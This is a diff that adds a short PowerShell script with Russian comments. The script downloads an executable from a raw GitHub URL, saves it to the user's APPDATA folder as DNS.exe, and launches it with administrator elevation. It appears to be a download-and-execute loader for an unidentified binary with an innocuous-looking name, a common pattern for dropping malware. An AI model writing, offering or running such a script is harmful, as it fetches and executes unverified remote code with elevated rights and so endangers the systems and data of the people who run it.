@@ -1,1 +1,18 @@
+# Определение URL и пути сохранения
+$url = "https://github.com/FREAKMANCHIK/WORK/raw/main/files/DNS "
+$outputPath = "$env:APPDATA\DNS.exe"
 
+# Загрузка файла
+Write-Host "Скачивание файла из $url в $outputPath..."
+
+try {
+    Invoke-WebRequest -Uri $url -OutFile $outputPath -ErrorAction Stop
+    Write-Host "Файл успешно сохранён."
+
+    # Запуск файла
+    Write-Host "Запуск файла..."
+    Start-Process -FilePath $outputPath -WorkingDirectory $env:APPDATA -Verb RunAs -Wait
+
+} catch {
+    Write-Host "Ошибка при скачивании или запуске файла: $_" -ForegroundColor Red
+}
